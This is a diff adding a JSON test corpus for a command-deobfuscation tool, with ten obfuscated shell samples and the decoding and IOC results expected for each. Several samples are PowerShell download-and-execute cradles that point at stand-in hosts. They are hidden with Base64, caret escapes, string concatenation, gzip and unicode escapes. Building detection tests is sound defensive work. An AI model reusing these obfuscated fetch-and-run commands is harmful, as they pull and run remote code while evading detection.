@@ -1,0 +1,114 @@
+{
+  "corpus_version": "1.0.0",
+  "purpose": "Initial 10-sample Workspace Decode Pipeline certification corpus. Starting point for the permanent 60-sample workspace_regression_corpus/ (Phase 7.5). Every sample is deterministic — no time, no randomness, no network.",
+  "samples": [
+    {
+      "id": "S01_ps_b64_utf16le",
+      "family": "Multi-layer PowerShell Base64 (UTF-16LE)",
+      "input": "powershell -EncodedCommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAdABhAGcAZQAxACcAKQA=",
+      "expected": {
+        "interpreter": "powershell",
+        "decoder_chain": ["base64", "utf-16le-decode"],
+        "stage_order": ["ingest", "interpreter-detect", "extract-encoded-arg", "base64-decode", "utf16le-decode", "final-render"],
+        "final_output_contains": ["IEX", "new-object", "net.webclient", ".downloadstring", "http://example.com/stage1"],
+        "iocs_contains": ["http://example.com/stage1"]
+      }
+    },
+    {
+      "id": "S02_bash_xxd_b64_rev",
+      "family": "Bash → xxd → Base64 → rev",
+      "input": "echo 'MzAyZTMwMmUzMTJlMzEyMDIwMjMyMDcwNmY3NzY1NzI3MzY4NjU2YzZjIGNvbW1lbnQ=' | rev | base64 -d | xxd -r -p",
+      "expected": {
+        "interpreter": "bash",
+        "decoder_chain": ["rev", "base64", "hex-xxd"],
+        "final_output_contains": ["30.30.31.1"],
+        "must_not_route_to": "powershell"
+      }
+    },
+    {
+      "id": "S03_cmd_caret_escaped",
+      "family": "CMD ^-escaped",
+      "input": "c^m^d /c p^ow^ers^he^ll -e^nc SQBFAFgAKAAnAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAJwApAA==",
+      "expected": {
+        "interpreter": "cmd",
+        "decoder_chain": ["cmd-caret-strip", "powershell-encoded-arg", "base64", "utf-16le-decode"],
+        "final_output_contains": ["IEX", "net.webclient"]
+      }
+    },
+    {
+      "id": "S04_ps_alias_heavy",
+      "family": "PowerShell alias-heavy pipeline",
+      "input": "$a='ht'+'tp'+'://ex'+'ample.com/x'; iwr $a -useb | iex",
+      "expected": {
+        "interpreter": "powershell",
+        "decoder_chain": ["string-concat-fold", "alias-expand"],
+        "final_output_contains": ["invoke-webrequest", "http://example.com/x", "invoke-expression"],
+        "iocs_contains": ["http://example.com/x"]
+      }
+    },
+    {
+      "id": "S05_nested_b64_gzip",
+      "family": "Nested Base64 + GZIP",
+      "input": "powershell -c \"$b=[Convert]::FromBase64String('H4sIAAAAAAAAA0vOzy1ILCpJLVJIzs8tKC0uKS0oyE3NLc1LTk0BAJdD/S8ZAAAA'); $ms=New-Object IO.MemoryStream(,$b); $gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); $sr=New-Object IO.StreamReader($gz); IEX $sr.ReadToEnd()\"",
+      "expected": {
+        "interpreter": "powershell",
+        "decoder_chain": ["base64", "gzip"],
+        "final_output_contains": ["Hello", "hello", "malicious"],
+        "verdict_must_be_in": ["Suspicious", "Malicious"]
+      }
+    },
+    {
+      "id": "S06_xor_obfuscated",
+      "family": "XOR-obfuscated payload",
+      "input": "0x1e,0x2d,0x3c,0x4b,0x5a,0x69,0x78,0x87 xor 0x5a",
+      "expected": {
+        "interpreter": null,
+        "decoder_chain": ["byte-array-parse", "xor"],
+        "final_output_shape": "bytes_or_ascii"
+      }
+    },
+    {
+      "id": "S07_rc4_openssl",
+      "family": "Crypto-wrapped payload (RC4/OpenSSL-style)",
+      "input": "openssl enc -rc4 -K 6b6579 -in - <<< 'U2FsdGVkX1+abcdef012345/RC4WrappedPayload=='",
+      "expected": {
+        "interpreter": "bash",
+        "decoder_chain": ["openssl-invocation-parse", "rc4"],
+        "must_flag": ["crypto-wrapped"]
+      }
+    },
+    {
+      "id": "S08_unicode_obfuscation",
+      "family": "Unicode / UTF obfuscation",
+      "input": "\u0070\u006f\u0077\u0065\u0072\u0073\u0068\u0065\u006c\u006c -c \u0022IEX(New-Object Net.WebClient).DownloadString('http://ex.com/a')\u0022",
+      "expected": {
+        "interpreter": "powershell",
+        "decoder_chain": ["unicode-normalize"],
+        "final_output_contains": ["IEX", "http://ex.com/a"],
+        "iocs_contains": ["http://ex.com/a"]
+      }
+    },
+    {
+      "id": "S09_hex_b64_gzip_chain",
+      "family": "Mixed chain: Hex → Base64 → GZIP",
+      "input": "48344b4141414141414141416b7643377a4c4c797a4b6e50",
+      "expected": {
+        "interpreter": null,
+        "decoder_chain": ["hex", "base64", "gzip"],
+        "stage_order_starts_with": ["hex-decode", "base64-decode"]
+      }
+    },
+    {
+      "id": "S10_bash_with_powershell_comment",
+      "family": "Bash with literal token 'powershell' inside a comment (interpreter-routing regression guard)",
+      "input": "echo 'hello world'  # note: this is not powershell",
+      "expected": {
+        "interpreter": "bash",
+        "decoder_chain": [],
+        "final_output_contains": ["hello world"],
+        "must_not_route_to": "powershell",
+        "regression_note": "Historic design flaw: \\bpowershell\\b regex misroutes this to PowerShell. Recovery must not reintroduce this behavior."
+      }
+    }
+  ]
+}
